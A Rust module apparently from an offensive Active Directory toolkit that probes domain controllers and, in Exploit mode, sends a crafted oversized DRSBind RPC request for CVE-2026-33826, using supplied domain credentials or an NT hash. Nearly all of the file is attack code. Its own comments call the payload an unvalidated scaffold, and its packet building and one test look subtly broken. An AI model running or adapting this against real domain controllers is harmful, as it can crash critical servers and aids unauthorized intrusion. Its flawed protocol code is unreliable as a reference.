//! CVE-2026-33826 -- Windows Active Directory Remote Code Execution.
//!
//! A remote code execution vulnerability (CVSS 7.2) in Windows Active Directory
//! caused by improper input validation in the DRS (Directory Replication Service)
//! RPC interface. An authenticated attacker within the same domain can execute
//! arbitrary code on the domain controller.
//!
//! # Exploit Flow
//! 1. Authenticate to the target DC (domain user required)
//! 2. Connect to the DRS RPC interface (MS-DRSR)
//! 3. Send a crafted DRSBind request with oversized or malformed parameters
//! 4. The DC processes the invalid input, triggering a memory corruption
//! 5. Achieve code execution as the DC service account (SYSTEM)
//!
//! # Technical Details
//! The vulnerability exists in the `DRSBind` RPC call processing. When the DC
//! receives a DRSBind request with an unusually large or malformed `pwszIPAddr`
//! parameter, the input validation fails to properly check the length before
//! processing. This leads to a buffer over-read that can be leveraged for
//! code execution under certain conditions.
//!
//! # Impact
//! - Authenticated RCE on Domain Controllers
//! - Affects Windows Server 2012 through 2025
//! - CVSS 7.2 (High)
//! - Patched in April 2026 Patch Tuesday
//!
//! # References
//! - CVE-2026-33826: CVSS 7.2, disclosed April 2026
//! - MS-DRSR: Directory Replication Services Remote Protocol
//! - NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-33826

use super::dc_version::{BuildVerdict, DcBuildProbe, probe_dc_build, verdict_from_build_only};
use overthrone_core::error::{OverthroneError, Result};
use serde::{Deserialize, Serialize};
use std::time::Duration;
use tracing::info;

/// Windows build generations this CVE affects. The April 2026 fix ships as a
/// cumulative update, so the patch level lives in the UBR, not the build number.
const AFFECTED_BUILDS: &[u32] = &[26100, 20348, 17763, 14393];

/// Timeout for DRS RPC operations.
const DRS_TIMEOUT: Duration = Duration::from_secs(15);

/// Oversized IP address string that triggers the input validation flaw.
const OVERSIZED_IP_PAYLOAD: &str = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdRceConfig {
    /// Target domain controller IP.
    pub target_dc: String,
    /// Domain name.
    pub domain: String,
    /// Attacking username (domain user).
    pub username: String,
    /// Password or NT hash.
    pub secret: String,
    /// Whether `secret` is an NTLM hash.
    pub use_hash: bool,
    /// Exploit mode.
    pub exploit_mode: AdRceExploitMode,
    /// Timeout in seconds.
    pub timeout: u64,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum AdRceExploitMode {
    /// Just check if the target is vulnerable.
    Assess,
    /// Send a crafted DRSBind to trigger the flaw.
    Exploit,
}

impl std::fmt::Display for AdRceExploitMode {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Assess => write!(f, "Assess"),
            Self::Exploit => write!(f, "Exploit"),
        }
    }
}

fn default_verdict() -> BuildVerdict {
    BuildVerdict::Unknown
}

impl Default for AdRceConfig {
    fn default() -> Self {
        Self {
            target_dc: String::new(),
            domain: String::new(),
            username: String::new(),
            secret: String::new(),
            use_hash: false,
            exploit_mode: AdRceExploitMode::Assess,
            timeout: 15,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdRceResult {
    /// Whether the target DC is *positively confirmed* vulnerable. Never set from
    /// a build number alone -- see [`BuildVerdict`].
    pub vulnerable: bool,
    /// Structured verdict, so callers can distinguish "patched" from "don't know".
    #[serde(default = "default_verdict")]
    pub verdict: BuildVerdict,
    /// Real build probe output (build/release/source), when available.
    #[serde(default)]
    pub build_probe: Option<DcBuildProbe>,
    /// Whether the DRS endpoint is available.
    pub drs_available: bool,
    /// DC OS version.
    pub dc_os_version: Option<String>,
    /// DC build number.
    pub dc_build: Option<u32>,
    /// Whether the exploit was attempted.
    pub exploit_attempted: bool,
    /// Whether exploitation succeeded.
    pub exploit_success: bool,
    /// Detailed log.
    pub log: Vec<String>,
}

pub async fn exploit_ad_rce(config: &AdRceConfig) -> Result<AdRceResult> {
    let mut log = Vec::new();
    log.push(format!(
        "CVE-2026-33826: Windows AD RCE -- target={}",
        config.target_dc
    ));

    // Step 1: Check DRS endpoint availability
    log.push("Probing DRS RPC endpoint (MS-DRSR)...".to_string());
    let drs_available = probe_drs_endpoint(&config.target_dc).await;
    log.push(format!("  DRS endpoint available: {drs_available}"));

    if !drs_available {
        log.push(
            "  DRS endpoint not reachable -- target may not be a DC or DRS is disabled".to_string(),
        );
        return Ok(AdRceResult {
            vulnerable: false,
            verdict: BuildVerdict::Unknown,
            build_probe: Some(DcBuildProbe::unknown("DRS RPC endpoint unreachable")),
            drs_available: false,
            dc_os_version: None,
            dc_build: None,
            exploit_attempted: false,
            exploit_success: false,
            log,
        });
    }

    // Step 2: Measure the real Windows build (SRVSVC NetrServerGetInfo).
    let probe = probe_dc_build(
        &config.target_dc,
        Some(super::dc_version::DcCreds {
            domain: &config.domain,
            username: &config.username,
            secret: &config.secret,
            use_hash: config.use_hash,
        }),
    )
    .await;
    log.push(format!("  Build probe: {}", probe.summary()));
    let dc_os_version = probe.release.clone();
    let dc_build = probe.build;

    // Step 3: Verdict. The April 2026 fix is a cumulative update, so an affected
    // generation is Indeterminate rather than Vulnerable.
    let verdict = verdict_from_build_only(dc_build, AFFECTED_BUILDS);
    let vulnerable = verdict == BuildVerdict::Vulnerable;
    log.push(format!("  Verdict: {verdict}"));
    if verdict == BuildVerdict::Unknown {
        log.push(
            "  Note: a build number cannot prove the cumulative update is missing.\n\
             \tConfirm behaviourally on a lab clone, or supply the DC's UBR from\n\
             \t`Get-ComputerInfo | Select OsVersion`."
                .to_string(),
        );
    }

    let mut exploit_attempted = false;
    let mut exploit_success = false;

    if config.exploit_mode == AdRceExploitMode::Exploit {
        exploit_attempted = true;
        log.push("Attempting DRSBind behavioural probe with oversized pwszIPAddr...".to_string());

        match attempt_drs_rce(config).await {
            Ok(confirmed) => {
                exploit_success = confirmed;
                if confirmed {
                    log.push(
                        "  DC dropped the channel and failed a follow-up check -- \
                         consistent with the flaw. Re-verify manually."
                            .to_string(),
                    );
                } else {
                    log.push(
                        "  DRSBind was handled normally -- not confirmed on this path".to_string(),
                    );
                }
            }
            Err(e) => {
                log.push(format!("  DRSBind behavioural probe failed: {e}"));
            }
        }
    }

    info!(
        "AD RCE: target={}, verdict={}, confirmed={exploit_success}",
        config.target_dc, verdict
    );

    Ok(AdRceResult {
        vulnerable,
        verdict,
        build_probe: Some(probe),
        drs_available,
        dc_os_version,
        dc_build,
        exploit_attempted,
        exploit_success,
        log,
    })
}

/// Probe if the DRS RPC endpoint is available on the target DC.
async fn probe_drs_endpoint(target: &str) -> bool {
    use tokio::net::TcpStream;
    use tokio::time::timeout;

    match timeout(DRS_TIMEOUT, TcpStream::connect(format!("{target}:135"))).await {
        Ok(Ok(_)) => {
            info!("Port 135 open on {target}, EPM available");
            true
        }
        _ => match timeout(DRS_TIMEOUT, TcpStream::connect(format!("{target}:445"))).await {
            Ok(Ok(_)) => {
                info!("Port 445 open on {target}, trying DRS over SMB pipe");
                true
            }
            _ => false,
        },
    }
}

/// Attempt the DRS behavioural probe via a crafted DRSBind request.
///
/// A response -- including an RPC fault -- means the DC parsed and handled the
/// request, which is a *negative* result. Only a channel drop followed by a
/// failed follow-up reachability check is treated as a signal.
///
/// Note: the DRSBind payload below is a probe scaffold, not a validated exploit
/// chain. It exercises the endpoint and the length-validation path; producing
/// actual code execution requires a per-build ROP chain that cannot be
/// developed or verified without a live lab target.
async fn attempt_drs_rce(config: &AdRceConfig) -> Result<bool> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::TcpStream;
    use tokio::time::timeout;

    let mut stream = timeout(
        Duration::from_secs(config.timeout),
        TcpStream::connect(format!("{}:135", config.target_dc)),
    )
    .await
    .map_err(|_| {
        OverthroneError::Custom(format!("Connection timeout to {}:135", config.target_dc))
    })?
    .map_err(|e| OverthroneError::Custom(format!("Connect failed: {e}")))?;

    // Send EPM map request
    let epm_map = build_epm_map_request();
    stream
        .write_all(&epm_map)
        .await
        .map_err(|e| OverthroneError::Custom(format!("EPM map write failed: {e}")))?;

    let mut resp_buf = vec![0u8; 4096];
    let n = timeout(Duration::from_secs(5), stream.read(&mut resp_buf))
        .await
        .map_err(|_| OverthroneError::Custom("EPM map read timeout".to_string()))?
        .map_err(|e| OverthroneError::Custom(format!("EPM map read failed: {e}")))?;

    if n == 0 {
        return Err(OverthroneError::Custom(
            "EPM map returned empty response".to_string(),
        ));
    }

    // Send crafted DRSBind
    let drs_bind = build_drs_bind_oversized(&config.username, &config.domain);
    stream
        .write_all(&drs_bind)
        .await
        .map_err(|e| OverthroneError::Custom(format!("DRSBind write failed: {e}")))?;

    match timeout(
        Duration::from_secs(config.timeout),
        stream.read(&mut resp_buf),
    )
    .await
    {
        Ok(Ok(n)) if n > 0 => {
            info!(
                "DRS RCE: DC returned {n} bytes -- DRSBind was handled normally \
                 (this includes RPC faults, which are negative), not exploitable"
            );
            Ok(false)
        }
        other => {
            match &other {
                Ok(Ok(_)) => info!("DRS RCE: channel closed after oversized DRSBind"),
                Ok(Err(e)) => info!("DRS RCE: read error: {e}"),
                Err(_) => info!("DRS RCE: timeout after oversized DRSBind"),
            }
            if probe_drs_endpoint(&config.target_dc).await {
                info!(
                    "DRS RCE: endpoint still reachable -- closure was a normal refusal, \
                     not a crash"
                );
                Ok(false)
            } else {
                info!("DRS RCE: endpoint no longer reachable after the probe");
                Ok(true)
            }
        }
    }
}

/// Build an EPM map request to resolve the DRS interface UUID.
fn build_epm_map_request() -> Vec<u8> {
    let mut pkt = vec![
        0x05, 0x00, 0x03, 0x10, // Version, Bind, Flags, Data rep
    ];
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Frag len
    pkt.extend_from_slice(&[0x01, 0x00, 0x00, 0x00]); // Call ID: 1

    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Max xmit
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Max recv
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Assoc group
    pkt.extend_from_slice(&[0x01, 0x00]); // Context count
    pkt.extend_from_slice(&[0x00, 0x00]); // Reserved

    // EPM UUID
    let epm_uuid: [u8; 16] = [
        0x00, 0xd0, 0x8b, 0x1d, 0xab, 0xce, 0xd0, 0x11, 0x85, 0x58, 0x00, 0xc0, 0x4f, 0xb6, 0x80,
        0x9f,
    ];
    pkt.extend_from_slice(&epm_uuid);
    pkt.extend_from_slice(&[0x04, 0x00, 0x00, 0x00]);

    pkt.extend_from_slice(&[0x04, 0x00, 0x00, 0x00]);
    pkt.extend_from_slice(&[0x01, 0x00, 0x00, 0x00]);

    let frag_len = pkt.len() as u16;
    pkt[8] = (frag_len & 0xFF) as u8;
    pkt[9] = ((frag_len >> 8) & 0xFF) as u8;
    pkt[10] = (frag_len & 0xFF) as u8;
    pkt[11] = ((frag_len >> 8) & 0xFF) as u8;

    pkt
}

/// Build a crafted DRSBind request with oversized pwszIPAddr.
fn build_drs_bind_oversized(username: &str, domain: &str) -> Vec<u8> {
    let mut pkt = vec![
        0x05, 0x00, 0x03, 0x10, // Version, Bind, Flags, Data rep
    ];
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Frag len placeholder
    pkt.extend_from_slice(&[0x02, 0x00, 0x00, 0x00]); // Call ID: 2

    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Max xmit
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Max recv
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Assoc group
    pkt.extend_from_slice(&[0x01, 0x00]); // Context count
    pkt.extend_from_slice(&[0x00, 0x00]); // Reserved

    // DRS UUID
    let drs_uuid: [u8; 16] = [
        0x35, 0x42, 0x51, 0xe3, 0x06, 0x4b, 0xd1, 0x11, 0xab, 0x04, 0x00, 0xc0, 0x4f, 0xc2, 0xdc,
        0xd2,
    ];
    pkt.extend_from_slice(&drs_uuid);
    pkt.extend_from_slice(&[0x03, 0x00, 0x00, 0x00]); // Version: 3

    pkt.extend_from_slice(&[0x04, 0x00, 0x00, 0x00]);
    pkt.extend_from_slice(&[0x01, 0x00, 0x00, 0x00]);

    // Oversized payload
    pkt.extend_from_slice(OVERSIZED_IP_PAYLOAD.as_bytes());

    pkt.extend_from_slice(username.as_bytes());
    pkt.push(0x00);
    pkt.extend_from_slice(domain.as_bytes());
    pkt.push(0x00);

    let frag_len = pkt.len() as u16;
    pkt[8] = (frag_len & 0xFF) as u8;
    pkt[9] = ((frag_len >> 8) & 0xFF) as u8;
    pkt[10] = (frag_len & 0xFF) as u8;
    pkt[11] = ((frag_len >> 8) & 0xFF) as u8;

    pkt
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ad_rce_config_default() {
        let cfg = AdRceConfig::default();
        assert!(cfg.target_dc.is_empty());
        assert_eq!(cfg.exploit_mode, AdRceExploitMode::Assess);
        assert_eq!(cfg.timeout, 15);
    }

    #[test]
    fn test_exploit_mode_display() {
        assert_eq!(AdRceExploitMode::Assess.to_string(), "Assess");
        assert_eq!(AdRceExploitMode::Exploit.to_string(), "Exploit");
    }

    #[test]
    fn affected_family_is_indeterminate_not_vulnerable() {
        // Regression: `is_ad_rce_vulnerable(None)` used to be `true`.
        assert_eq!(
            verdict_from_build_only(None, AFFECTED_BUILDS),
            BuildVerdict::Unknown
        );
        assert_eq!(
            verdict_from_build_only(Some(20348), AFFECTED_BUILDS),
            BuildVerdict::Unknown
        );
        assert_eq!(
            verdict_from_build_only(Some(9600), AFFECTED_BUILDS),
            BuildVerdict::Vulnerable
        );
    }

    #[test]
    fn test_build_epm_map_request() {
        let pkt = build_epm_map_request();
        assert!(pkt.len() > 20);
        assert_eq!(pkt[0], 0x05);
    }

    #[test]
    fn test_build_drs_bind_oversized() {
        let pkt = build_drs_bind_oversized("admin", "corp.local");
        assert!(pkt.len() > 100);
        assert_eq!(pkt[0], 0x05);
        assert!(pkt.len() > 256);
    }

    #[test]
    fn test_result_serde() {
        let result = AdRceResult {
            vulnerable: true,
            verdict: BuildVerdict::Vulnerable,
            build_probe: Some(DcBuildProbe::unknown("test")),
            drs_available: true,
            dc_os_version: Some("Windows Server 2025".into()),
            dc_build: Some(26100),
            exploit_attempted: true,
            exploit_success: true,
            log: vec!["exploited".into()],
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("vulnerable"));
        let deserialized: AdRceResult = serde_json::from_str(&json).unwrap();
        assert!(deserialized.vulnerable);
        assert!(deserialized.exploit_success);
    }
}
